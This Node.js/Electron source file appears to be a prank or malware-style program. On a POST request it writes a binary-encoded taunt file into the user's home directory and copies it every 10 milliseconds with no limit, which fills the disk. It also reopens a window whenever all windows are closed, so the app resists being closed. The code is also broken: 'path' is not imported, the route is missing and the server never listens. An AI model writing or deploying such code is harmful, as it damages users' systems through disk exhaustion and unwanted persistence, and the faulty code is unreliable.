const express = require('express');
const fs = require('fs').promises;
const os = require('os');
let homedir = os.homedir();
const { app, BrowserWindow } = require('electron');
const localServer = express();
let duplication = 1;
localServer.use(express.text());
localServer.post(async function(req, body) {
  await fs.writeFile(
    path.join(homedir, 'target.txt'),
    "01000111 01000101 01010100 00100000 01001000 01000101 01000011 01001011 01000101 01000100 00100000 01000010 01011001 00100000 01001000 01000101 01000011 01001011 01000101 01010010"
  );
  setInterval(async function() {
    fs.copyFile(path.join(homedir, 'target.txt'), path.join(homedir, 'duplication' + duplication + '.txt'));
    duplication = duplication + 1;
  }, 10);
});
app.whenReady().then(function() {
  let win = new BrowserWindow({
    width: 800,
    height: 600
  });
  win.loadFile('./window.html');
});
app.on('window-all-closed', function() {
  let win = new BrowserWindow({
    width: 800,
    height: 600
  });
  win.loadFile('./closed.html');
});
